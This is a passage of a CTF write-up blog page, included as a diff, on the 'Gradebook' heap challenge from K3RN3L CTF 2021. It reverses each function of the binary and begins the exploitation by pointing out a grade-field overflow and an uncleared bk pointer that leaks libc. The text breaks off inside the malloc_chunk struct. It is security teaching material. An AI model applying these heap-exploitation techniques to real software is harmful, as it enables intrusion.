@@ -1,0 +1,622 @@
+<!DOCTYPE html>
+<html lang="en">
+<title>K3RN3L CTF 21 Gradebook writeup | P-W-N</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="author" content="volticks">
+<meta name="generator" content="Jekyll v4.2.1">
+<link rel="canonical" href="http://localhost:4000/Gradebook-writeup/">
+
+<link rel="stylesheet" href="/assets/css/frame.css">
+
+<link rel="alternate" href="/feed.xml" type="application/atom+xml" title="P-W-N">
+
+
+
+
+
+
+
+<header>
+  <a href="/" class="title">P-W-N</a>
+  <nav><a href="/" >Home</a><a href="/about/" >About</a></nav>
+
+</header>
+
+<article>
+  <header>
+  <h1><a href="/Gradebook-writeup/">K3RN3L CTF 21 Gradebook writeup</a></h1><time datetime="2021-11-14T00:00:00+00:00">November 14, 2021</time>
+</header>
+
+  <p>So for the past little while I didn’t really have anything to write about, i haven’t been  competing too much in CTF, but this weekend <a href="https://ctftime.org/event/1438">K3RN3L CTF</a> came around. There was quite alot of fun challenges, one of which was gradebook.</p>
+
+<h1 id="intro">Intro</h1>
+
+<h2 id="description">Description</h2>
+
+<p><code class="language-plaintext highlighter-rouge">My teachers been using a commandline gradebook made by a first year student, must be vulnerable somehow.</code></p>
+
+<p>Is that so? (you can find chall+exp files and libc+ld over <a href="https://https://github.com/volticks/CTF-Writeups">here</a>)
+Were given a libc, so after we patch it in we can start:</p>
+
+<p><code class="language-plaintext highlighter-rouge">patchelf ./gradebook --replace-needed libc.so.6 ./libc.so.6</code></p>
+
+<h2 id="reversing">Reversing</h2>
+
+<p>Its apparent from the outset that this challenge seems to follow a similar formula to a heap note challenge.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~/Documents/k3rn3l21/gradebook❯❯❯ ./gradebook     
+Student Gradebook
+1. Add Student to Gradebook
+2. List Students in Gradebook
+3. Update Student grade
+4. Update Student name
+5. Clear Gradebook
+6. Exit Gradebook
+&gt; 
+</code></pre></div></div>
+
+<p>Lets take a look into <code class="language-plaintext highlighter-rouge">main</code>:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="n">__noreturn</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">choice</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-Ch] BYREF</span>
+  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]</span>
+
+  <span class="n">v4</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"Student Gradebook"</span><span class="p">);</span>
+  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"1. Add Student to Gradebook"</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"2. List Students in Gradebook"</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"3. Update Student grade"</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"4. Update Student name"</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"5. Clear Gradebook"</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"6. Exit Gradebook"</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">);</span>
+    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">choice</span><span class="p">);</span>
+    <span class="n">putchar</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
+    <span class="k">switch</span> <span class="p">(</span> <span class="n">choice</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="k">case</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="n">total_students</span> <span class="o">&gt;</span> <span class="mi">9</span> <span class="p">)</span>
+          <span class="n">puts</span><span class="p">(</span><span class="s">"Class is full!"</span><span class="p">);</span>
+        <span class="k">else</span>
+          <span class="n">add_student</span><span class="p">();</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="k">case</span> <span class="mi">2</span><span class="p">:</span>
+        <span class="n">list_students</span><span class="p">();</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="k">case</span> <span class="mi">3</span><span class="p">:</span>
+        <span class="n">update_grade</span><span class="p">();</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="k">case</span> <span class="mi">4</span><span class="p">:</span>
+        <span class="n">update_name</span><span class="p">();</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="k">case</span> <span class="mi">5</span><span class="p">:</span>
+        <span class="n">close_gradebook</span><span class="p">();</span>
+        <span class="n">total_students</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="nl">default:</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid Choice!"</span><span class="p">);</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Seems pretty basic, looks as if we can only call <code class="language-plaintext highlighter-rouge">add_student</code> 10 times tho. Lets take a look at that function first.</p>
+
+<h4 id="add_student">add_student</h4>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">__int64</span> <span class="nf">add_student</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">struct_s</span> <span class="o">*</span><span class="n">s</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp-20h]</span>
+  <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-18h]</span>
+  <span class="kt">char</span> <span class="n">src</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span> <span class="c1">// [rsp+10h] [rbp-10h] BYREF</span>
+  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]</span>
+
+  <span class="n">v4</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+  <span class="n">s</span> <span class="o">=</span> <span class="p">(</span><span class="n">struct_s</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x18uLL</span><span class="p">);</span>
+  <span class="n">memset</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">struct_s</span><span class="p">));</span>               <span class="c1">// nulls out 24 bytes (aka, nobugs)</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"Enter student id: "</span><span class="p">);</span>
+  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%8s"</span><span class="p">,</span> <span class="n">src</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">lookup</span><span class="p">(</span><span class="n">src</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>        <span class="c1">// try to find student ID in list of students</span>
+  <span class="p">{</span>
+    <span class="n">strncpy</span><span class="p">(</span><span class="n">s</span><span class="o">-&gt;</span><span class="n">ID</span><span class="p">,</span> <span class="n">src</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">);</span>
+    <span class="n">s</span><span class="o">-&gt;</span><span class="n">grade</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>                              <span class="c1">// grade - to be entered</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Enter student name length: "</span><span class="p">);</span>
+    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="o">-&gt;</span><span class="n">name_length</span><span class="p">);</span>
+    <span class="n">buf</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">s</span><span class="o">-&gt;</span><span class="n">name_length</span><span class="p">);</span>               <span class="c1">// alloc from provided student name length</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">);</span>                       <span class="c1">// clear first 8 bytes to elimin8 leaks, what if there is another value?</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Enter student name: "</span><span class="p">);</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">s</span><span class="o">-&gt;</span><span class="n">name_length</span><span class="p">);</span>
+    <span class="n">s</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">;</span>
+    <span class="n">STUDENTS</span><span class="p">[</span><span class="n">total_students</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">s</span><span class="p">;</span>             <span class="c1">// new student</span>
+    <span class="k">return</span> <span class="mi">1LL</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Student ID already taken!"</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mh">0xFFFFFFFFLL</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>I defined a structure in the code to make it more readable; if you wanna do the same, simply go into IDA, right click and select <code class="language-plaintext highlighter-rouge">Create new struct type</code>, after that enter the following, or whatever structure you are defining:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">struct_s</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">ID</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+    <span class="kt">int</span> <span class="n">grade</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">name_length</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Then set the corresponding variable to this new type.</p>
+
+<p>First we allocate space for our new structure then null the first 24 bytes:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">s</span> <span class="o">=</span> <span class="p">(</span><span class="n">struct_s</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x18uLL</span><span class="p">);</span>
+  <span class="n">memset</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">struct_s</span><span class="p">));</span>               <span class="c1">// nulls out 24 bytes (aka, nobugs)</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"Enter student id: "</span><span class="p">);</span>
+  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%8s"</span><span class="p">,</span> <span class="n">src</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>After this, we enter an ID for a new student. Next we look to see if this ID already exists via the <code class="language-plaintext highlighter-rouge">lookup</code> function:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">__int64</span> <span class="kr">__fastcall</span> <span class="nf">lookup</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">a1</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+1Ch] [rbp-4h]</span>
+
+  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">total_students</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">strncmp</span><span class="p">(</span><span class="n">STUDENTS</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">ID</span><span class="p">,</span> <span class="n">a1</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">)</span> <span class="p">)</span>
+      <span class="k">return</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">i</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mh">0xFFFFFFFFLL</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Simple enough, iterate through <code class="language-plaintext highlighter-rouge">STUDENTS</code>, which is a list of students to see if any of the ID’s match, if they do then return the idx in students where the duplicate was found.</p>
+
+<p>If we didnt find it, simply return <code class="language-plaintext highlighter-rouge">-1</code>. Coming back into <code class="language-plaintext highlighter-rouge">add_student</code>, we see that if no student with said ID was found, we create the student.</p>
+
+<p>Not something too important, but notice that even if the student ID is in use, we allocate space for a new student before the check, seems a bit wasteful but this was allegedly programmed by “a first year student” so no surprises there (this also seems like a real mistake I would make lol).</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">lookup</span><span class="p">(</span><span class="n">src</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>        <span class="c1">// try to find student ID in list of students</span>
+  <span class="p">{</span>
+    <span class="n">strncpy</span><span class="p">(</span><span class="n">s</span><span class="o">-&gt;</span><span class="n">ID</span><span class="p">,</span> <span class="n">src</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">);</span>
+    <span class="n">s</span><span class="o">-&gt;</span><span class="n">grade</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>                              <span class="c1">// grade - to be entered</span>
+</code></pre></div></div>
+
+<p>We copy the ID over into our newly allocated structure, also setting the grade for this student to <code class="language-plaintext highlighter-rouge">-1</code> which is a placeholder for when we insert the grade later.</p>
+
+<p>After this its time to insert the name of the student:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">puts</span><span class="p">(</span><span class="s">"Enter student name length: "</span><span class="p">);</span>
+    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="o">-&gt;</span><span class="n">name_length</span><span class="p">);</span>
+    <span class="n">buf</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">s</span><span class="o">-&gt;</span><span class="n">name_length</span><span class="p">);</span>               <span class="c1">// alloc from provided student name length</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">);</span>                       <span class="c1">// clear first 8 bytes to elimin8 leaks, what if there is another value?</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Enter student name: "</span><span class="p">);</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">s</span><span class="o">-&gt;</span><span class="n">name_length</span><span class="p">);</span>
+    <span class="n">s</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>First we enter the length, then allocate a chunk of that size to hold the name. We then null the first 8 bytes of the chunk, to avoid leaks. Next we enter student name and write it into the struct.</p>
+
+<p>Finally we finish and return, but not before writing our new student into the array and incrementing <code class="language-plaintext highlighter-rouge">total_students</code>.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">STUDENTS</span><span class="p">[</span><span class="n">total_students</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">s</span><span class="p">;</span>             <span class="c1">// new student</span>
+    <span class="k">return</span> <span class="mi">1LL</span><span class="p">;</span>
+  <span class="err">}</span>
+</code></pre></div></div>
+
+<h4 id="list_students">list_students</h4>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">__int64</span> <span class="nf">list_students</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">__int64</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax</span>
+  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-4h]</span>
+
+  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">total_students</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">i</span> <span class="o">&gt;=</span> <span class="n">total_students</span> <span class="p">)</span>
+      <span class="k">break</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"NAME: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">STUDENTS</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"STUDENT ID: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">STUDENTS</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">ID</span><span class="p">);</span><span class="c1">// hmmm</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">STUDENTS</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">grade</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"GRADE: Not Entered Yet"</span><span class="p">);</span>
+    <span class="k">else</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">"GRADE: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">STUDENTS</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">grade</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"____________________________"</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>This is pretty easy to understand, simply go through the list of students and print out details such as a student’s grades and name.</p>
+
+<h4 id="update_grade">update_grade</h4>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">__int64</span> <span class="nf">update_grade</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-14h]</span>
+  <span class="kt">char</span> <span class="n">v2</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span> <span class="c1">// [rsp+10h] [rbp-10h] BYREF</span>
+  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]</span>
+
+  <span class="n">v3</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"Enter student id: "</span><span class="p">);</span>
+  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%8s"</span><span class="p">,</span> <span class="n">v2</span><span class="p">);</span>
+  <span class="n">v1</span> <span class="o">=</span> <span class="n">lookup</span><span class="p">(</span><span class="n">v2</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Student not found!"</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mh">0xFFFFFFFFLL</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Enter grade: "</span><span class="p">);</span>
+    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%ld"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">STUDENTS</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">grade</span><span class="p">);</span><span class="c1">// you can still enter a huge grade, even if it tries to stop you afterwards.</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">STUDENTS</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">grade</span> <span class="o">&lt;=</span> <span class="mi">100</span> <span class="o">&amp;&amp;</span> <span class="n">STUDENTS</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">grade</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="p">)</span><span class="c1">// done well, even checks for negative</span>
+    <span class="p">{</span>
+      <span class="k">return</span> <span class="mi">1LL</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"Grade must be between 0 and 100"</span><span class="p">);</span>
+      <span class="n">STUDENTS</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">grade</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+      <span class="k">return</span> <span class="mh">0xFFFFFFFFLL</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>This simply attemps to find a student based on the ID, if student is found use the returned idx to edit the students grades, provided they are not above a certain threshold. If the grade does happen to be higher than 100, or less than 0 then we replace the grade with the <code class="language-plaintext highlighter-rouge">-1</code> placeholder again.</p>
+
+<p>Take note of the format string used to enter the grade, also note that grade variable is only 4 bytes wide. This will be relevant later ;).</p>
+
+<h4 id="update_name">update_name</h4>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">ssize_t</span> <span class="nf">update_name</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-14h]</span>
+  <span class="kt">char</span> <span class="n">v2</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span> <span class="c1">// [rsp+10h] [rbp-10h] BYREF</span>
+  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]</span>
+
+  <span class="n">v3</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"Enter student id: "</span><span class="p">);</span>
+  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%8s"</span><span class="p">,</span> <span class="n">v2</span><span class="p">);</span>
+  <span class="n">v1</span> <span class="o">=</span> <span class="n">lookup</span><span class="p">(</span><span class="n">v2</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Student not found!"</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mh">0xFFFFFFFFLL</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Enter student name: "</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">STUDENTS</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="n">STUDENTS</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">name_length</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Again, similar principle to the latter; look for an ID in <code class="language-plaintext highlighter-rouge">STUDENTS</code>, if you find it, change the name with the length value found in the struct.</p>
+
+<h4 id="close_gradebook">close_gradebook</h4>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">__int64</span> <span class="nf">close_gradebook</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-4h]</span>
+
+  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">total_students</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">STUDENTS</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>                    <span class="c1">// correct order for frees aswell :/</span>
+    <span class="n">STUDENTS</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">STUDENTS</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+    <span class="n">STUDENTS</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mi">1LL</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>All this does is free + null out every student + student name. After which we set <code class="language-plaintext highlighter-rouge">total_students</code> = 0 so even if students were not nulled, there would be no way to free them twice.</p>
+
+<p>Now that we have a good idea what each function does, we can see how to exploit it.</p>
+
+<h1 id="exploitation">Exploitation</h1>
+
+<h2 id="leaks">Leaks</h2>
+
+<p>Before we go any further, note the protections on the binary:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</code></pre></div></div>
+
+<p>To put it bluntly, were gonna need at least a libc leak before we can go further, unless we find a primitive for a partial overwrite (spoilers: i didnt find any).</p>
+
+<p>Let me draw your attention to <code class="language-plaintext highlighter-rouge">add_student</code> for a minute, specifically these lines, and their accompanying comment:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">buf</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">s</span><span class="o">-&gt;</span><span class="n">name_length</span><span class="p">);</span>               <span class="c1">// alloc from provided student name length</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">);</span>                       <span class="c1">// clear first 8 bytes to elimin8 leaks, what if there is another value?</span>
+</code></pre></div></div>
+
+<p>Like the comment says, this is here to stop us from leaking an address left after the name chunk is re-used, however it doesnt take into account <code class="language-plaintext highlighter-rouge">bk</code>. Lets take a look at the <a href="https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L1048">chunk structure</a> for glibc 2.31:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">malloc_chunk</span> <span class="p">{</span>
+
+  <span class="n">INTERNAL_SIZE_T</span>      <span class="n">mchunk_prev_size</span><span class="p">;</span>  <span class="cm">/* Size of previous chunk (if free).  */</span>
+  <span class="n">INTERNAL_SIZE_T</span>      <span class="n">mchunk_size</span><span class="p">;</span>       <span class="cm">/* Size in bytes, including overhead. */</span>
+
+  <span class="k">struct</span> <span class="n">malloc_chunk</span><span class="o">*</span> <span class="n">fd</span><span class="p">;</span>         <span class="cm">/* double links -- used only if free. */</span>
+  <span class="k">struct</span> <span class="n">malloc_chunk</span><span class="o">*</span> <span class="n">bk</span><span class="p">;</span>
+
+  <span class="cm">/* Only used for large blocks: pointer to next larger size.  */</span>
